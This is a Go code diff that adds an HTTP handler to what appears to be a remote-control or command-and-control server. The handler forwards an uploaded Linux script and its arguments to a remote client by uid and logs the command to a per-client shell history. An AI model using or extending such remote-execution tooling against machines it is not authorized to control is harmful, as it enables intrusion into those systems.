@@ -645,3 +645,60 @@ func ExecuteBin(c *gin.Context) {
 	}
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
 }
+
+func ExecuteLinuxScript(c *gin.Context) {
+	file, _ := c.FormFile("file")
+	if file == nil {
+		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+		return
+	}
+	// 打开上传的文件
+	src, err := file.Open()
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
+		return
+	}
+	defer src.Close()
+
+	// 读取文件内容到字节数组
+	fileBytes, err := ioutil.ReadAll(src)
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
+		return
+	}
+
+	uid := c.PostForm("uid")
+	args := c.PostForm("args")
+
+	var shellHistory database.Shell
+	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
+	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + "execute-linux-sh " + file.Filename + " " + args + "\n"
+	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
+
+	// 获取客户端信息以检查操作系统架构
+	// var client database.Clients
+	// database.Engine.Where("uid = ?", uid).Get(&client)
+
+	// 检查客户端操作系统是否为Windows
+	// if client.Os == "Windows" || client.Os == "windows" {
+	// 	// Windows客户端返回不支持消息
+	// 	unsupportedMsg := "[!] 当前客户端为Windows架构，不支持Linux脚本执行\n"
+	// 	shellHistory.ShellContent = shellHistory.ShellContent + unsupportedMsg
+	// 	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
+	// 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	// 	return
+	// }
+
+	// 构建脚本内容消息
+	fileLength := len(fileBytes)
+	fileLengthBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+	byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+
+	cmdTypeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
+	byteToSend = append(cmdTypeBytes, byteToSend...)
+	sendcommand.SendCommandBytes(uid, byteToSend)
+
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
